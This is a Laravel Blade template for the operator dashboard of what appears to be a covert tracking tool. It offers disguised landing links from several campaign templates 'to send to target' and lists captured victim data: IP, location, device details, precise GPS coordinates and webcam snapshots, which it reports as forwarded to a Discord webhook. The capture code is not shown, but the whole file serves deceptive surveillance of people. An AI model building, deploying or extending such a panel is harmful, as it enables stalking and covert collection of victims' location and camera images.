@extends('layouts.admin')

@section('title', 'Overview')

@section('content')
<div class="space-y-8 max-w-7xl mx-auto">

    <!-- Top Header & Quick Action -->
    <div class="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
            <h1 class="text-2xl font-bold text-white tracking-tight">Mission Control</h1>
            <p class="text-zinc-400 text-sm mt-1">Real-time target telemetry, multi-template campaign manager, and webcam captures.</p>
        </div>

        <div class="flex items-center gap-3">
            <div class="flex items-center px-3 py-1.5 rounded-full border text-xs font-mono {{ $discordConfigured ? 'bg-emerald-950/40 border-emerald-800/80 text-emerald-400' : 'bg-amber-950/40 border-amber-800/80 text-amber-400' }}">
                <span class="w-2 h-2 rounded-full mr-2 {{ $discordConfigured ? 'bg-emerald-500 animate-pulse' : 'bg-amber-500' }}"></span>
                Discord Webhook: {{ $discordConfigured ? 'CONNECTED' : 'NOT SET' }}
            </div>
            <a href="{{ route('admin.settings') }}" class="px-4 py-2 text-xs font-medium bg-zinc-800 hover:bg-zinc-700 text-white rounded-lg transition">
                <i class="fa-solid fa-sliders mr-1.5"></i> Config
            </a>
        </div>
    </div>

    <!-- Active Target Link Card & Template Selector -->
    <div class="p-6 rounded-2xl bg-gradient-to-r from-zinc-900 via-zinc-900 to-pink-950/30 border border-zinc-800 shadow-xl space-y-4">
        <div class="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
            <div class="space-y-1">
                <div class="flex items-center gap-2">
                    <span class="text-xs uppercase font-mono tracking-wider text-pink-400 font-semibold">Active Disguised URL</span>
                    <span class="px-2 py-0.5 rounded-full bg-pink-950/60 border border-pink-800/60 text-pink-300 text-[10px] font-mono">
                        Template: {{ $templates[$activeTemplate]['name'] ?? $activeTemplate }}
                    </span>
                </div>
                <div class="text-xs text-zinc-400">Send this landing link to target. Telemetry & Discord triggers will fire automatically in backend.</div>
            </div>
            <div class="flex items-center gap-2 max-w-xl w-full">
                <input type="text" id="targetLink" readonly value="{{ route('landing') }}" 
                       class="w-full bg-zinc-950 border border-zinc-700/80 rounded-xl px-4 py-2.5 text-xs text-pink-300 font-mono focus:outline-none select-all">
                <button onclick="copyTargetLink('targetLink', 'copyBtnText')" class="px-4 py-2.5 bg-pink-600 hover:bg-pink-500 text-white text-xs font-medium rounded-xl transition shrink-0 flex items-center gap-1.5 shadow-lg shadow-pink-600/20">
                    <i class="fa-solid fa-copy"></i>
                    <span id="copyBtnText">Copy Link</span>
                </button>
            </div>
        </div>

        <!-- Template Campaign Links Quick Row -->
        <div class="pt-4 border-t border-zinc-800/80">
            <span class="text-[11px] uppercase font-mono tracking-wider text-zinc-500 font-semibold block mb-2.5">
                <i class="fa-solid fa-layer-group text-pink-400 mr-1"></i> Quick Campaign Template Links:
            </span>
            <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2">
                @foreach($templates as $id => $tpl)
                    <div class="p-2.5 rounded-xl bg-zinc-950 border border-zinc-800 flex flex-col justify-between hover:border-pink-500/40 transition">
                        <div class="flex items-center justify-between mb-1.5">
                            <span class="w-6 h-6 rounded-md bg-gradient-to-tr {{ $tpl['color'] }} flex items-center justify-center text-[10px] text-white">
                                <i class="fa-solid {{ $tpl['icon'] }}"></i>
                            </span>
                            <span class="text-[9px] font-mono {{ $activeTemplate === $id ? 'text-pink-400 font-bold' : 'text-zinc-500' }}">
                                {{ $activeTemplate === $id ? 'DEFAULT' : '/p/' . $id }}
                            </span>
                        </div>
                        <div class="text-[11px] font-semibold text-zinc-200 truncate mb-2" title="{{ $tpl['name'] }}">{{ $tpl['name'] }}</div>
                        <div class="flex items-center justify-between gap-1 pt-1 border-t border-zinc-900">
                            <a href="{{ route('landing.custom', $id) }}" target="_blank" class="text-[10px] text-zinc-400 hover:text-white">
                                <i class="fa-solid fa-eye"></i>
                            </a>
                            <button onclick="copyDirectUrl('{{ route('landing.custom', $id) }}', this)" class="text-[10px] text-pink-400 hover:text-pink-300 font-mono">
                                Copy URL
                            </button>
                        </div>
                    </div>
                @endforeach
            </div>
        </div>
    </div>

    <!-- Stats Grid -->
    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-5">
        <div class="p-6 rounded-2xl bg-zinc-900/90 border border-zinc-800 relative overflow-hidden">
            <div class="flex items-center justify-between">
                <div>
                    <p class="text-xs font-medium uppercase tracking-wider text-zinc-400">Total Visits Logged</p>
                    <h3 class="text-3xl font-black text-white mt-2">{{ number_format($totalLogs) }}</h3>
                </div>
                <div class="w-12 h-12 rounded-xl bg-blue-500/10 border border-blue-500/20 flex items-center justify-center text-blue-400 text-xl">
                    <i class="fa-solid fa-users"></i>
                </div>
            </div>
            <p class="text-[11px] text-zinc-500 mt-4">Browser, OS, IP reconnaissance</p>
        </div>

        <div class="p-6 rounded-2xl bg-zinc-900/90 border border-zinc-800 relative overflow-hidden">
            <div class="flex items-center justify-between">
                <div>
                    <p class="text-xs font-medium uppercase tracking-wider text-zinc-400">GPS Coordinates</p>
                    <h3 class="text-3xl font-black text-amber-400 mt-2">{{ number_format($totalGps) }}</h3>
                </div>
                <div class="w-12 h-12 rounded-xl bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-400 text-xl">
                    <i class="fa-solid fa-location-dot"></i>
                </div>
            </div>
            <p class="text-[11px] text-zinc-500 mt-4">High precision coordinates logged</p>
        </div>

        <div class="p-6 rounded-2xl bg-zinc-900/90 border border-zinc-800 relative overflow-hidden">
            <div class="flex items-center justify-between">
                <div>
                    <p class="text-xs font-medium uppercase tracking-wider text-zinc-400">Webcam Snapshots</p>
                    <h3 class="text-3xl font-black text-pink-400 mt-2">{{ number_format($totalSnapshots) }}</h3>
                </div>
                <div class="w-12 h-12 rounded-xl bg-pink-500/10 border border-pink-500/20 flex items-center justify-center text-pink-400 text-xl">
                    <i class="fa-solid fa-camera"></i>
                </div>
            </div>
            <p class="text-[11px] text-zinc-500 mt-4">Photos forwarded & saved locally</p>
        </div>
    </div>

    <!-- Recent Logs Table -->
    <div class="rounded-2xl bg-zinc-900 border border-zinc-800 overflow-hidden shadow-xl">
        <div class="p-5 border-b border-zinc-800 flex items-center justify-between">
            <div class="flex items-center space-x-2">
                <i class="fa-solid fa-satellite-dish text-pink-400"></i>
                <h3 class="font-semibold text-white text-base">Recent Target Activity</h3>
            </div>
            <a href="{{ route('admin.logs') }}" class="text-xs text-pink-400 hover:text-pink-300 font-medium">
                View All Logs &rarr;
            </a>
        </div>

        @if($recentLogs->isEmpty())
            <div class="p-12 text-center text-zinc-500">
                <i class="fa-solid fa-radar text-4xl mb-3 opacity-40"></i>
                <p class="text-sm">No target activity recorded yet. Share the landing link to start capturing telemetry.</p>
            </div>
        @else
            <div class="overflow-x-auto scrollbar-slim">
                <table class="w-full text-left text-xs">
                    <thead class="bg-zinc-950/60 text-zinc-400 uppercase font-mono text-[10px] tracking-wider border-b border-zinc-800">
                        <tr>
                            <th class="p-4">Target IP / Location</th>
                            <th class="p-4">Device / OS</th>
                            <th class="p-4">GPS Status</th>
                            <th class="p-4">Photos</th>
                            <th class="p-4">Captured At</th>
                            <th class="p-4 text-right">Action</th>
                        </tr>
                    </thead>
                    <tbody class="divide-y divide-zinc-800/60 text-zinc-300">
                        @foreach($recentLogs as $log)
                            <tr class="hover:bg-zinc-850/60 transition">
                                <td class="p-4 font-mono">
                                    <div class="font-bold text-white">{{ $log->ip }}</div>
                                    <div class="text-[11px] text-zinc-400">{{ $log->city ?? 'Unknown' }}, {{ $log->country ?? 'Unknown' }}</div>
                                    @if($log->isp)
                                        <div class="text-[10px] text-zinc-500 truncate max-w-xs">{{ $log->isp }}</div>
                                    @endif
                                </td>
                                <td class="p-4">
                                    <div class="text-zinc-200">{{ $log->platform ?? 'Unknown' }}</div>
                                    <div class="text-[11px] text-zinc-400 truncate max-w-xs">{{ $log->screen_resolution ?? 'Screen: N/A' }} | RAM: {{ $log->ram ? $log->ram . 'GB' : 'N/A' }}</div>
                                </td>
                                <td class="p-4">
                                    @if($log->gps_lat && $log->gps_lon)
                                        <a href="https://www.google.com/maps/place/{{ $log->gps_lat }},{{ $log->gps_lon }}" target="_blank" 
                                           class="inline-flex items-center px-2.5 py-1 rounded-md bg-amber-950/50 border border-amber-800/60 text-amber-300 text-[11px] hover:bg-amber-900/60 transition">
                                            <i class="fa-solid fa-map-location-dot mr-1"></i> Maps Preview
                                        </a>
                                    @elseif($log->gps_error)
                                        <span class="inline-flex items-center px-2 py-0.5 rounded text-[10px] bg-red-950/40 text-red-400 border border-red-800/40">
                                            Denied
                                        </span>
                                    @else
                                        <span class="text-zinc-500 font-mono">Pending</span>
                                    @endif
                                </td>
                                <td class="p-4">
                                    @if($log->snapshots->isNotEmpty())
                                        <span class="inline-flex items-center px-2 py-1 rounded-md bg-pink-950/50 border border-pink-800/60 text-pink-300 text-[11px] font-mono">
                                            <i class="fa-solid fa-camera mr-1"></i> {{ $log->snapshots->count() }} snaps
                                        </span>
                                    @else
                                        <span class="text-zinc-500 font-mono">-</span>
                                    @endif
                                </td>
                                <td class="p-4 font-mono text-zinc-400 text-[11px]">
                                    {{ $log->created_at->diffForHumans() }}
                                </td>
                                <td class="p-4 text-right">
                                    <a href="{{ route('admin.logs', ['search' => $log->ip]) }}" class="px-2.5 py-1 text-xs bg-zinc-800 hover:bg-zinc-700 text-zinc-200 rounded transition">
                                        Details
                                    </a>
                                </td>
                            </tr>
                        @endforeach
                    </tbody>
                </table>
            </div>
        @endif
    </div>

</div>

<script>
function copyTargetLink(inputId, btnTextId) {
    const input = document.getElementById(inputId);
    input.select();
    input.setSelectionRange(0, 99999);
    navigator.clipboard.writeText(input.value);
    
    const btnText = document.getElementById(btnTextId);
    btnText.innerText = 'Copied!';
    setTimeout(() => {
        btnText.innerText = 'Copy Link';
    }, 2000);
}

function copyDirectUrl(url, btn) {
    navigator.clipboard.writeText(url).then(() => {
        const orig = btn.innerText;
        btn.innerText = 'Copied!';
        setTimeout(() => {
            btn.innerText = orig;
        }, 1800);
    });
}
</script>
@endsection
